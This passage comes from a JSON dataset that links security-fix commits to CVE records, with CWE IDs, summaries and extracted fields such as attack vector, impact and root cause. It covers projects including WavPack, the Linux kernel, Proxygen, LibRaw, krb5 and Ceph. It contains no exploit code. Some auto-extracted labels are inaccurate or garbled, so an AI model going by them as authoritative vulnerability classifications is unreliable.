CAF file.","commit_message_1":"issue # <number> , fix buffer overflow and bad allocs on corrupt caf file","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a maliciously crafted caf file","Impact":"cause a denial - of - service ( global buffer over - read ) , or possibly trigger a buffer overflow or incorrect memory allocation","Root Cause":"caused by a global buffer over-read flaw","Attack Type":"remote attacker"},{"commit_id":"36a24c7881427d2e1e4dc1cef58f19eee0d13aec","cve_id":"CVE-2018-7253","cwe_id":"CWE-125","commit_message":"issue #28, do not overwrite heap on corrupt DSDIFF file","summary":"The ParseDsdiffHeaderConfig function of the cli\/dsdiff.c file of WavPack 5.1.0 allows a remote attacker to cause a denial-of-service (heap-based buffer over-read) or possibly overwrite the heap via a maliciously crafted DSDIFF file.","commit_message_1":"issue # <number> , do not overwrite heap on corrupt dsdiff file","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a maliciously crafted dsdiff file","Impact":"cause a denial - of - service ( heap - based buffer over - read ) or possibly overwrite the heap","Root Cause":"caused by a heap-based buffer over-read flaw","Attack Type":"remote attacker"},{"commit_id":"c1079bb8e77cdd426759e466729917ca37a3ed9f","cve_id":"CVE-2018-7247","cwe_id":"CWE-119","commit_message":"prog\/htmlviewer: Catch unbound memory access (CID 1386222)\n\nrootname can have any size, so limit the amount of copied bytes.\n\nSigned-off-by: Stefan Weil <sw@weilnetz.de>","summary":"An issue was discovered in pixHtmlViewer in prog\/htmlviewer.c in Leptonica before 1.75.3. Unsanitized input (rootname) can overflow a buffer, leading potentially to arbitrary code execution or possibly unspecified other impact.","commit_message_1":"catch unbound memory access ( cid <number> ) rootname can have any size , so limit the amount of copied byte","Vulnerability Type":"buffer overflow","Attack Vector":"By sending a specially-crafted requeest","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by improper bounds checking by the pixHtmlViewer function","Attack Type":"remote attacker"},{"commit_id":"ee301cb2029db8a6289c5295daa42bba7715e99a","cve_id":"CVE-2018-7186","cwe_id":"CWE-119","commit_message":"Security fixes: expect final changes for release 1.75.3.\n* Fixed a debian security issue with fscanf() reading a string with\n  possible buffer overflow.\n* There were also a few similar situations with sscanf().","summary":"Leptonica before 1.75.3 does not limit the number of characters in a %s format argument to fscanf or sscanf, which allows remote attackers to cause a denial of service (stack-based buffer overflow) or possibly have unspecified other impact via a long string, as demonstrated by the gplotRead and ptaReadStream functions.","commit_message_1":"expect final change for release <file>","Vulnerability Type":"buffer overflow","Attack Vector":"via a long string , as demonstrated by the gplotread and ptareadstream functions","Impact":"cause a denial of service ( stack - based buffer overflow ) or possibly have unspecified other impact","Root Cause":"does not limit the number of characters","Attack Type":"remote attacker"},{"commit_id":"fbe0e839d1e22d88810f3ee3e2f1479be4c0aa4a","cve_id":"CVE-2018-6927","cwe_id":"CWE-190","commit_message":"futex: Prevent overflow by strengthen input validation\n\nUBSAN reports signed integer overflow in kernel\/futex.c:\n\n UBSAN: Undefined behaviour in kernel\/futex.c:2041:18\n signed integer overflow:\n 0 - -2147483648 cannot be represented in type 'int'\n\nAdd a sanity check to catch negative values of nr_wake and nr_requeue.\n\nSigned-off-by: Li Jinyue <lijinyue@huawei.com>\nSigned-off-by: Thomas Gleixner <tglx@linutronix.de>\nCc: peterz@infradead.org\nCc: dvhart@infradead.org\nCc: stable@vger.kernel.org\nLink: https:\/\/lkml.kernel.org\/r\/1513242294-31786-1-git-send-email-lijinyue@huawei.com","summary":"The futex_requeue function in kernel\/futex.c in the Linux kernel before 4.14.15 might allow attackers to cause a denial of service (integer overflow) or possibly have unspecified other impact by triggering a negative wake or requeue value.","commit_message_1":"prevent overflow by strengthen input validation ubsan report signed integer overflow in kernel\/<file> : ubsan : undefined behaviour in kernel\/<file> : <number> : <number> signed integer overflow : <number> - -<number> can not be represented in type 'int ' add a sanity check to catch negative value of nr_wake and nr_requeue","Vulnerability Type":"integer overflow","Attack Vector":"by triggering a negative wake or requeue value","Impact":"cause a denial of service ( integer overflow ) or possibly have unspecified other impact","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"d5bf76b5a88d044a1be1d5656698e3ba737167e5","cve_id":"CVE-2018-6767","cwe_id":"CWE-119","commit_message":"issue #27, do not overwrite stack on corrupt RF64 file","summary":"A stack-based buffer over-read in the ParseRiffHeaderConfig function of cli\/riff.c file of WavPack 5.1.0 allows a remote attacker to cause a denial-of-service attack or possibly have unspecified other impact via a maliciously crafted RF64 file.","commit_message_1":"issue # <number> , do not overwrite stack on corrupt rf64 file","Vulnerability Type":"buffer overflow","Attack Vector":"via a maliciously crafted rf64 file","Impact":"cause a denial - of - service attack or possibly have unspecified other impact","Root Cause":"caused by a stack-based buffer over-read flaw","Attack Type":"remote attacker"},{"commit_id":"cb4636f7c0af2e97a4eef7a3cdcbd85a71247bfe","cve_id":"CVE-2018-6758","cwe_id":"CWE-119","commit_message":"improve uwsgi_expand_path() to sanitize input, avoiding stack corruption and potential security issue","summary":"The uwsgi_expand_path function in core\/utils.c in Unbit uWSGI through 2.0.15 has a stack-based buffer overflow via a large directory length.","commit_message_1":"improve uwsgi_expand_path ( ) to sanitize input , avoiding stack corruption and potential security issue","Vulnerability Type":"buffer overflow","Attack Vector":"By using a large directory length","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"has a stack - based buffer overflow via","Attack Type":"remote attacker"},{"commit_id":"61fc6d3030a4d4283105cb5fb46b27b42fa5575e","cve_id":"CVE-2018-6611","cwe_id":"CWE-125","commit_message":"[Fix] STP: Possible out-of-bounds memory read with malformed STP files (caught with afl-fuzz).\n\ngit-svn-id: https:\/\/source.openmpt.org\/svn\/openmpt\/trunk\/OpenMPT@9567 56274372-70c3-4bfc-bfc3-4c3a0b034d27","summary":"soundlib\/Load_stp.cpp in OpenMPT through 1.27.04.00, and libopenmpt before 0.3.6, has an out-of-bounds read via a malformed STP file.","commit_message_1":"possible out-of-bounds memory read with malformed stp file ( caught with afl-fuzz )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by an out-of-bounds read flaw","Attack Type":"remote attacker"},{"commit_id":"52346bf187b5a7f1c0fe9075b328b7ad6abe78f6","cve_id":"CVE-2018-6560","cwe_id":"CWE-436","commit_message":"Fix vulnerability in dbus proxy\n\nDuring the authentication all client data is directly forwarded\nto the dbus daemon as is, until we detect the BEGIN command after\nwhich we start filtering the binary dbus protocol.\n\nUnfortunately the detection of the BEGIN command in the proxy\ndid not exactly match the detection in the dbus daemon. A BEGIN\nfollowed by a space or tab was considered ok in the daemon but\nnot by the proxy. This could be exploited to send arbitrary\ndbus messages to the host, which can be used to break out of\nthe sandbox.\n\nThis was noticed by Gabriel Campana of The Google Security Team.\n\nThis fix makes the detection of the authentication phase end\nmatch the dbus code. In addition we duplicate the authentication\nline validation from dbus, which includes ensuring all data is\nASCII, and limiting the size of a line to 16k. In fact, we add\nsome extra stringent checks, disallowing ASCII control chars and\nrequiring that auth lines start with a capital letter.","summary":"In dbus-proxy\/flatpak-proxy.c in Flatpak before 0.8.9, and 0.9.x and 0.10.x before 0.10.3, crafted D-Bus messages to the host can be used to break out of the sandbox, because whitespace handling in the proxy is not identical to whitespace handling in the daemon.","commit_message_1":"fix vulnerability in dbus proxy during the authentication all client data is directly forwarded to the dbus daemon a is , until we detect the begin command after which we start filtering the binary dbus protocol","Vulnerability Type":"Interpretation Conflict","Attack Vector":"By sending specially-crafted D-Bus messages","Impact":"break out of the sandbox","Root Cause":"bypass security restrictions, caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"223e0aa6bc7590e86af1e917185a2e0efe160711","cve_id":"CVE-2018-6347","cwe_id":"CWE-20","commit_message":"Don't lower lastStreamID_\n\nSummary:\nThis could throw off the logic about what is headers\/trailers\nCVE-2018-6347\n\nReviewed By: avasylev, bolekk\n\nDifferential Revision: D13521704\n\nfbshipit-source-id: ed436ff13f191bf04764494973fcb73b35ed1256","summary":"An issue in the Proxygen handling of HTTP2 parsing of headers\/trailers can lead to a denial-of-service attack. This affects Proxygen prior to v2018.12.31.00.","commit_message_1":"this could throw off the logic about what is headers\/trailers <cve_id> reviewed by : avasylev , bolekk","Vulnerability Type":"Improper Input Validation","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by improper handling of HTTP2 parsing of headers\/trailers","Attack Type":"remote attacker"},{"commit_id":"52cf331743ebd74194d6343a6c2ec52bb917c982","cve_id":"CVE-2018-6346","cwe_id":"CWE-388","commit_message":"Fix h2 codec state after bad priority header.\n\nSummary:\nIt's possible for the http2 codec to enter an invalid state after processing a http2 header with invalid priorities.\nCVE-2018-6346\n\nReviewed By: maxgeorg\n\nDifferential Revision: D13510025\n\nfbshipit-source-id: 7c4e42daf1cd2b912454d13a66ab8488d1863263","summary":"A potential denial-of-service issue in the Proxygen handling of invalid HTTP2 priority settings (specifically a circular dependency). This affects Proxygen prior to v2018.12.31.00.","commit_message_1":"fix h2 codec state after bad priority header","Vulnerability Type":"7PK - Errors","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by improper handling of invalid HTTP2 priority settings","Attack Type":"remote attacker"},{"commit_id":"0600ebe59c3e82cd012def77ca9ca1918da74a71","cve_id":"CVE-2018-6343","cwe_id":"CWE-20","commit_message":"Check that a secondary auth manager is set before dereferencing.\n\nSummary: CVE-2018-6343\n\nReviewed By: mingtaoy\n\nDifferential Revision: D12994423\n\nfbshipit-source-id: 9229ec11da8085f1fa153595e8e5353e19d06fb7","summary":"Proxygen fails to validate that a secondary auth manager is set before dereferencing it. That can cause a denial of service issue when parsing a Certificate\/CertificateRequest HTTP2 Frame over a fizz (TLS 1.3) transport. This issue affects Proxygen releases starting from v2018.10.29.00 until the fix in v2018.11.19.00.","commit_message_1":"check that a secondary auth manager is set before dereferencing","Vulnerability Type":"Improper Input Validation","Attack Vector":"By parsing a Certificate\/CertificateRequest HTTP2 Frame over a fizz (TLS 1.3) transport","Impact":"cause a denial of service","Root Cause":"caused by the failure to validate that a secondary auth manager is set before dereferencing it","Attack Type":"remote attacker"},{"commit_id":"8e927ee48b114c8a2f90d0cbd5ac753795a6761f","cve_id":"CVE-2018-6337","cwe_id":"CWE-119","commit_message":"Flush secureRandom buffer on fork\n\nSummary: On fork, flush the secureRandom buffer, so that we don't share entropy between the parent and child.\n\nReviewed By: ricklavoie\n\nDifferential Revision: D9196474\n\nfbshipit-source-id: 12ff8488d814466186df61328a5f1d4000beb27f","summary":"folly::secureRandom will re-use a buffer between parent and child processes when fork() is called. That will result in multiple forked children producing repeat (or similar) results. This affects HHVM 3.26 prior to 3.26.3 and the folly library between v2017.12.11.00 and v2018.08.09.00.","commit_message_1":"flush securerandom buffer on fork summary : on fork , flush the securerandom buffer , so that we do n't share entropy between the parent and child","Vulnerability Type":"buffer overflow","Attack Vector":"between parent and child processes when fork() is called","Impact":"launch further attacks on the system","Root Cause":"caused by reusing the buffer","Attack Type":"remote attacker"},{"commit_id":"6937de5544c3eead3466b75020d8382080ed0cff","cve_id":"CVE-2018-6334","cwe_id":"CWE-20","commit_message":"[security][CVE-2018-6334] kill globals for file uploads in hhvm\n\nCode should look at _GET, _POST, _FILES, etc. directly to avoid security concerns.\n\nThis included both `$GLOBALS` and `register_globals`-like behavior.\n\nCVE-2018-6334","summary":"Multipart-file uploads call variables to be improperly registered in the global scope. In cases where variables are not declared explicitly before being used this can lead to unexpected behavior. This affects all supported versions of HHVM prior to the patch (3.25.1, 3.24.5, and 3.21.9 and below).","commit_message_1":"[ <cve_id> ] kill globals for file uploads in hhvm code should look at _get , _post , _files , etc","Vulnerability Type":"Improper Input Validation","Attack Vector":"By uploading a specially-crafted file","Impact":"bypass security restrictions","Root Cause":"caused by improper registering of multipart-file uploads call variables","Attack Type":"remote attacker"},{"commit_id":"18dcbadf2771cdb0c18509b14e4e73505b242753","cve_id":"CVE-2018-6198","cwe_id":"CWE-59","commit_message":"Make temporary directory safely when ~\/.w3m is unwritable","summary":"w3m through 0.5.3 does not properly handle temporary files when the ~\/.w3m directory is unwritable, which allows a local attacker to craft a symlink attack to overwrite arbitrary files.","commit_message_1":"make temporary directory safely when ~\/","Vulnerability Type":"Link Following","Attack Vector":"by creating a symbolic link from a temporary file to various files on the system","Impact":"overwrite arbitrary files","Root Cause":"caused by the improper handling of temporary files when the ~\/.w3m directory is unwritable","Attack Type":"local attacker"},{"commit_id":"7fdc83b0364005a0b5ed869230dd81752ba022e8","cve_id":"CVE-2018-6197","cwe_id":"CWE-476","commit_message":"Prevent invalid columnPos() call in formUpdateBuffer()\n\nBug-Debian: https:\/\/github.com\/tats\/w3m\/issues\/89","summary":"w3m through 0.5.3 is prone to a NULL pointer dereference flaw in formUpdateBuffer in form.c.","commit_message_1":"prevent invalid columnpos ( ) call in formupdatebuffer ( )","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"a NULL pointer dereference flaw in formUpdateBuffer in form.c","Impact":"cause a denial of service","Root Cause":"is prone to a pointer dereference flaw","Attack Type":"remote attacker"},{"commit_id":"8354763b90490d4105695df52674d0fcef823e92","cve_id":"CVE-2018-6196","cwe_id":"CWE-835","commit_message":"Prevent negative indent value in feed_table_block_tag()\n\nBug-Debian: https:\/\/github.com\/tats\/w3m\/issues\/88","summary":"w3m through 0.5.3 is prone to an infinite recursion flaw in HTMLlineproc0 because the feed_table_block_tag function in table.c does not prevent a negative indent value.","commit_message_1":"prevent negative indent value in feed_table_block_tag ( )","Vulnerability Type":"Infinite Loop","Attack Vector":"prone to an infinite recursion flaw","Impact":"cause a denial of service","Root Cause":"caused by an infinite recursion flaw","Attack Type":"remote attacker"},{"commit_id":"073c516ff73557a8f7315066856c04b50383ac34","cve_id":"CVE-2018-5873","cwe_id":"CWE-416","commit_message":"nsfs: mark dentry with DCACHE_RCUACCESS\n\nAndrey reported a use-after-free in __ns_get_path():\n\n  spin_lock include\/linux\/spinlock.h:299 [inline]\n  lockref_get_not_dead+0x19\/0x80 lib\/lockref.c:179\n  __ns_get_path+0x197\/0x860 fs\/nsfs.c:66\n  open_related_ns+0xda\/0x200 fs\/nsfs.c:143\n  sock_ioctl+0x39d\/0x440 net\/socket.c:1001\n  vfs_ioctl fs\/ioctl.c:45 [inline]\n  do_vfs_ioctl+0x1bf\/0x1780 fs\/ioctl.c:685\n  SYSC_ioctl fs\/ioctl.c:700 [inline]\n  SyS_ioctl+0x8f\/0xc0 fs\/ioctl.c:691\n\nWe are under rcu read lock protection at that point:\n\n        rcu_read_lock();\n        d = atomic_long_read(&ns->stashed);\n        if (!d)\n                goto slow;\n        dentry = (struct dentry *)d;\n        if (!lockref_get_not_dead(&dentry->d_lockref))\n                goto slow;\n        rcu_read_unlock();\n\nbut don't use a proper RCU API on the free path, therefore a parallel\n__d_free() could free it at the same time.  We need to mark the stashed\ndentry with DCACHE_RCUACCESS so that __d_free() will be called after all\nreaders leave RCU.\n\nFixes: e149ed2b805f (\"take the targets of \/proc\/*\/ns\/* symlinks to separate fs\")\nCc: Alexander Viro <viro@zeniv.linux.org.uk>\nCc: Andrew Morton <akpm@linux-foundation.org>\nReported-by: Andrey Konovalov <andreyknvl@google.com>\nSigned-off-by: Cong Wang <xiyou.wangcong@gmail.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"An issue was discovered in the __ns_get_path function in fs\/nsfs.c in the Linux kernel before 4.11. Due to a race condition when accessing files, a Use After Free condition can occur. This also affects all Android releases from CAF using the Linux kernel (Android for MSM, Firefox OS for MSM, QRD Android) before security patch level 2018-07-05.","commit_message_1":"mark dentry with dcache_rcuaccess andrey reported a use-after-free in __ns_get_path ( ) : spin_lock include\/linux\/<file> : <number> [ inline ] lockref_get_not_dead+0x19\/0x80 lib\/<file> : <number> __ns_get_path+0x197\/0x860 fs\/<file> : <number> open_related_ns+0xda\/0x200 fs\/<file> : <number> sock_ioctl+0x39d\/0x440 net\/<file> : <number> vfs_ioctl fs\/<file> : <number> [ inline ] do_vfs_ioctl+0x1bf\/0x1780 fs\/<file> : <number> sysc_ioctl fs\/<file> : <number> [ inline ] sys_ioctl+0x8f\/0xc0 fs\/<file> : <number> we are under rcu read lock protection at that point : rcu_read_lock ( ) ; d = atomic_long_read ( & ns- > stashed ) ; if ( ! d ) goto slow ; dentry = ( struct dentry * ) d ; if ( ! lockref_get_not_dead ( & dentry- > d_lockref ) ) goto slow ; rcu_read_unlock ( ) ; but do n't use a proper rcu api on the free path , therefore a parallel __d_free ( ) could free it at the same time","Vulnerability Type":"Use After Free","Attack Vector":"By using a specially-crafted file","Impact":"gain elevated privileges","Root Cause":"caused by a race condition","Attack Type":"local attacker"},{"commit_id":"1d8d1b452e5dc74033ee9f846081a0efb616cc39","cve_id":"CVE-2018-5816","cwe_id":"CWE-190","commit_message":"reject broken\/crafted NOKIARAW files","summary":"An integer overflow error within the *identify()* function (internal\/dcraw_common.cpp) in LibRaw versions prior to 0.18.12 can be exploited to trigger a division by zero via specially crafted NOKIARAW file (Note: This vulnerability is caused due to an incomplete fix of CVE-2018-5804).","commit_message_1":"reject broken\/crafted nokiaraw file","Vulnerability Type":"integer overflow","Attack Vector":"via specially crafted nokiaraw file","Impact":"cause a denial of service","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"1334647862b0c90b2e8cb2f668e66627d9517b17","cve_id":"CVE-2018-5815","cwe_id":"CWE-190","commit_message":"parse_qt: possible integer overflow","summary":"An integer overflow error within the *parse_qt()* function (internal\/dcraw_common.cpp) in LibRaw versions prior to 0.18.12 can be exploited to trigger an infinite loop via a specially crafted Apple QuickTime file.","commit_message_1":"parse_qt : possible integer overflow","Vulnerability Type":"integer overflow","Attack Vector":"By persuading a victim to open a specially-crafted Apple QuickTime file","Impact":"cause a denial of service","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"fd6330292501983ac75fe4162275794b18445bd9","cve_id":"CVE-2018-5812","cwe_id":"CWE-476","commit_message":"Secunia 81800#1: samsumg_load_raw\n\nSecunia 81800#2: find_green\n\nSecunia 81800#3: rollei_load_raw\n\nremove_trailing_spaces: isspace() does not works right with signed non-latin chars\n\nSecunia 81800#5\/6: nikon_coolscan_load_raw\n\nSecunia 81800#4: rollei_load_raw","summary":"An error within the *nikon_coolscan_load_raw()* function (internal\/dcraw_common.cpp) in LibRaw versions prior to 0.18.9 can be exploited to trigger a NULL pointer dereference.","commit_message_1":"samsumg_load_raw secunia <number> # <number> : find_green secunia <number> # <number> : rollei_load_raw remove_trailing_spaces : isspace ( ) doe not work right with signed non-latin char secunia <number> # <number>\/<number> : nikon_coolscan_load_raw secunia <number> # <number> : rollei_load_raw","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"9f26ce37f5be86ea11bfc6831366558650b1f6ff","cve_id":"CVE-2018-5806","cwe_id":"CWE-476","commit_message":"SA81000: LibRaw 0.18.8","summary":"An error within the *leaf_hdr_load_raw()* function (internal\/dcraw_common.cpp) in LibRaw versions prior to 0.18.8 can be exploited to trigger a NULL pointer dereference.","commit_message_1":"sa81000 : libraw <file>","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"e1caf6fb74981da62039846931ebdffed71309d1","cve_id":"CVE-2018-5730","cwe_id":"CWE-90","commit_message":"Fix flaws in LDAP DN checking\n\nKDB_TL_USER_INFO tl-data is intended to be internal to the LDAP KDB\nmodule, and not used in disk or wire principal entries.  Prevent\nkadmin clients from sending KDB_TL_USER_INFO tl-data by giving it a\ntype number less than 256 and filtering out type numbers less than 256\nin kadm5_create_principal_3().  (We already filter out low type\nnumbers in kadm5_modify_principal()).\n\nIn the LDAP KDB module, if containerdn and linkdn are both specified\nin a put_principal operation, check both linkdn and the computed\nstandalone_principal_dn for container membership.  To that end, factor\nout the checks into helper functions and call them on all applicable\nclient-influenced DNs.\n\nCVE-2018-5729:\n\nIn MIT krb5 1.6 or later, an authenticated kadmin user with permission\nto add principals to an LDAP Kerberos database can cause a null\ndereference in kadmind, or circumvent a DN container check, by\nsupplying tagged data intended to be internal to the database module.\nThanks to Sharwan Ram and Pooja Anil for discovering the potential\nnull dereference.\n\nCVE-2018-5730:\n\nIn MIT krb5 1.6 or later, an authenticated kadmin user with permission\nto add principals to an LDAP Kerberos database can circumvent a DN\ncontainership check by supplying both a \"linkdn\" and \"containerdn\"\ndatabase argument, or by supplying a DN string which is a left\nextension of a container DN string but is not hierarchically within\nthe container DN.\n\nticket: 8643 (new)\ntags: pullup\ntarget_version: 1.16-next\ntarget_version: 1.15-next","summary":"MIT krb5 1.6 or later allows an authenticated kadmin with permission to add principals to an LDAP Kerberos database to circumvent a DN containership check by supplying both a *linkdn* and *containerdn* database argument, or by supplying a DN string which is a left extension of a container DN string but is not hierarchically within the container DN.","commit_message_1":"fix flaw in ldap dn checking kdb_tl_user_info tl-data is intended to be internal to the ldap kdb module , and not used in disk or wire principal entry","Vulnerability Type":"LDAP Injection","Attack Vector":"by supplying both a * linkdn * and * containerdn * database argument , or by supplying a dn string which is a left extension of a container dn string but is not hierarchically within the container dn","Impact":"add principals to an ldap kerberos database to circumvent a dn containership check","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"ae6650163c66a7eff1acd6eb8b0f752dcfa8eba5","cve_id":"CVE-2018-5344","cwe_id":"CWE-416","commit_message":"loop: fix concurrent lo_open\/lo_release\n\n\u8303\u9f99\u98de reports that KASAN can report a use-after-free in __lock_acquire.\nThe reason is due to insufficient serialization in lo_release(), which\nwill continue to use the loop device even after it has decremented the\nlo_refcnt to zero.\n\nIn the meantime, another process can come in, open the loop device\nagain as it is being shut down. Confusion ensues.\n\nReported-by: \u8303\u9f99\u98de <long7573@126.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\nSigned-off-by: Jens Axboe <axboe@kernel.dk>","summary":"In the Linux kernel through 4.14.13, drivers\/block\/loop.c mishandles lo_release serialization, which allows attackers to cause a denial of service (__lock_acquire use-after-free) or possibly have unspecified other impact.","commit_message_1":"fix concurrent lo_open\/lo_release \u8303\u9f99\u98de report that kasan can report a use-after-free in __lock_acquire","Vulnerability Type":"Use After Free","Attack Vector":"mishandles lo_release serialization","Impact":"cause a denial of service ( _ _ lock _ acquire use - after - free ) or possibly have unspecified other impact","Root Cause":"caused by a use-after-free","Attack Type":"local attacker"},{"commit_id":"7d11f77f84b27cef452cee332f4e469503084737","cve_id":"CVE-2018-5333","cwe_id":"CWE-476","commit_message":"RDS: null pointer dereference in rds_atomic_free_op\n\nset rm->atomic.op_active to 0 when rds_pin_pages() fails\nor the user supplied address is invalid,\nthis prevents a NULL pointer usage in rds_atomic_free_op()\n\nSigned-off-by: Mohamed Ghannam <simo.ghannam@gmail.com>\nAcked-by: Santosh Shilimkar <santosh.shilimkar@oracle.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"In the Linux kernel through 4.14.13, the rds_cmsg_atomic function in net\/rds\/rdma.c mishandles cases where page pinning fails or an invalid address is supplied, leading to an rds_atomic_free_op NULL pointer dereference.","commit_message_1":"null pointer dereference in rds_atomic_free_op set rm- > <file> to <number> when rds_pin_pages ( ) fails or the user supplied address is invalid , this prevents a null pointer usage in rds_atomic_free_op ( )","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"In the Linux kernel through 4.14.13, the rds_cmsg_atomic function in net\/rds\/rdma.c","Impact":"cause a denial of service","Root Cause":"caused by an rds_atomic_free_op NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"c095508770aebf1b9218e77026e48345d719b17c","cve_id":"CVE-2018-5332","cwe_id":"CWE-787","commit_message":"RDS: Heap OOB write in rds_message_alloc_sgs()\n\nWhen args->nr_local is 0, nr_pages gets also 0 due some size\ncalculation via rds_rm_size(), which is later used to allocate\npages for DMA, this bug produces a heap Out-Of-Bound write access\nto a specific memory region.\n\nSigned-off-by: Mohamed Ghannam <simo.ghannam@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"In the Linux kernel through 4.14.13, the rds_message_alloc_sgs() function does not validate a value that is used during DMA page allocation, leading to a heap-based out-of-bounds write (related to the rds_rdma_extra_size function in net\/rds\/rdma.c).","commit_message_1":"heap oob write in rds_message_alloc_sgs ( ) when args- > nr_local is <number> , nr_pages get also <number> due some size calculation via rds_rm_size ( ) , which is later used to allocate page for dma , this bug produce a heap out-of-bound write access to a specific memory region","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"a heap-based out-of-bounds write in the rds_rdma_extra_size function in net\/rds\/rdma.c","Impact":"cause a denial of service","Root Cause":"does not validate a value that is used during dma page allocation , leading to a heap - based out - of - bounds write ( related to the rds _ rdma _ extra _ size function","Attack Type":"local attacker"},{"commit_id":"4be817e8b03e7e92517e91f2dfcc50865e91c6ea","cve_id":"CVE-2018-1281","cwe_id":"CWE-200","commit_message":"Avoid listening on all interfaces by default","summary":"The clustered setup of Apache MXNet allows users to specify which IP address and port the scheduler will listen on via the DMLC_PS_ROOT_URI and DMLC_PS_ROOT_PORT env variables. In versions older than 1.0.0, however, the MXNet framework will listen on 0.0.0.0 rather than user specified DMLC_PS_ROOT_URI once a scheduler node is initialized. This exposes the instance running MXNet to any attackers reachable via the interface they didn't expect to be listening on. For example: If a user wants to run a clustered setup locally, they may specify to run on 127.0.0.1. But since MXNet will listen on 0.0.0.0, it makes the port accessible on all network interfaces.","commit_message_1":"avoid listening on all interface by default","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via the dmlc _ ps _ root _ uri and dmlc _ ps _ root _ port env variables . in versions older than 1 . 0 . 0","Impact":"ip address and port the scheduler will listen on","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"43e84cff1bb2bd8293066f6ac4eb0df61ddddbc6","cve_id":"CVE-2018-1152","cwe_id":"CWE-369","commit_message":"tjLoadImage(): Fix FPE triggered by malformed BMP\n\nIn rdbmp.c, it is necessary to guard against 32-bit overflow\/wraparound\nwhen allocating the row buffer, because since BMP files have 32-bit\nwidth and height fields, the value of biWidth can be up to 4294967295.\nSpecifically, if biWidth is 1073741824 and cinfo->input_components = 4,\nthen the samplesperrow argument in alloc_sarray() would wrap around to\n0, and a division by zero error would occur at line 458 in jmemmgr.c.\n\nIf biWidth is set to a higher value, then samplesperrow would wrap\naround to a small number, which would likely cause a buffer overflow\n(this has not been tested or verified.)","summary":"libjpeg-turbo 1.5.90 is vulnerable to a denial of service vulnerability caused by a divide by zero when processing a crafted BMP image.","commit_message_1":"fix fpe triggered by malformed bmp in <file> , it is necessary to guard against <number>-bit overflow\/wraparound when allocating the row buffer , because since bmp file have <number>-bit width and height field , the value of biwidth can be up to <number>","Vulnerability Type":"Divide By Zero","Attack Vector":"By persuading a victim to open a specially crafted BMP image","Impact":"cause a denial of service","Root Cause":"caused by a divide-by-zero when processing a BMP image","Attack Type":"remote attacker"},{"commit_id":"8f396cf35a3826044b089141667a196454c0a587","cve_id":"CVE-2018-1129","cwe_id":"CWE-287","commit_message":"auth\/cephx\/CephxSessionHandler: implement CEPHX_V2 calculation mode\n\nDerive the signature from the entire buffer (both cipher blocks).\n\nSigned-off-by: Sage Weil <sage@redhat.com>","summary":"A flaw was found in the way signature calculation was handled by cephx authentication protocol. An attacker having access to ceph cluster network who is able to alter the message payload was able to bypass signature checks done by cephx protocol. Ceph branches master, mimic, luminous and jewel are believed to be vulnerable.","commit_message_1":"implement cephx_v2 calculation mode derive the signature from the entire buffer ( both cipher block )","Vulnerability Type":"Improper Authentication","Attack Vector":"By altering the message payload","Impact":"bypass security restrictions","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"5ead97120e07054d80623dada90a5cc764c28468","cve_id":"CVE-2018-1128","cwe_id":"CWE-287","commit_message":"auth\/cephx: add authorizer challenge\n\nAllow the accepting side of a connection to reject an initial authorizer\nwith a random challenge.  The connecting side then has to respond with an\nupdated authorizer proving they are able to decrypt the service's challenge\nand that the new authorizer was produced for this specific connection\ninstance.\n\nThe accepting side requires this challenge and response unconditionally\nif the client side advertises they have the feature bit.  Servers wishing\nto require this improved level of authentication simply have to require\nthe appropriate feature.\n\nSigned-off-by: Sage Weil <sage@redhat.com>\n(cherry picked from commit f80b848d3f830eb6dba50123e04385173fa4540b)\n\n# Conflicts:\n#\tsrc\/auth\/Auth.h\n#\tsrc\/auth\/cephx\/CephxProtocol.cc\n#\tsrc\/auth\/cephx\/CephxProtocol.h\n#\tsrc\/auth\/none\/AuthNoneProtocol.h\n#\tsrc\/msg\/Dispatcher.h\n#\tsrc\/msg\/async\/AsyncConnection.cc\n\n- const_iterator\n- ::decode vs decode\n- AsyncConnection ctor arg noise\n- get_random_bytes(), not cct->random()","summary":"It was found that cephx authentication protocol did not verify ceph clients correctly and was vulnerable to replay attack. Any attacker having access to ceph cluster network who is able to sniff packets on network can use this vulnerability to authenticate with ceph service and perform actions allowed by ceph service. Ceph branches master, mimic, luminous and jewel are believed to be vulnerable.","commit_message_1":"add authorizer challenge allow the accepting side of a connection to reject an initial authorizer with a random challenge","Vulnerability Type":"Improper Authentication","Attack Vector":"By sniffing packets on the network","Impact":"bypass security restrictions","Root Cause":"caused by the improper verification of ceph clients by the cephx authentication protocol","Attack Type":"attacker"},{"commit_id":"c1fa0768a8713b135848f78fd43ffc208d8ded70","cve_id":"CVE-2018-1091","cwe_id":"CWE-119","commit_message":"powerpc\/tm: Flush TM only if CPU has TM 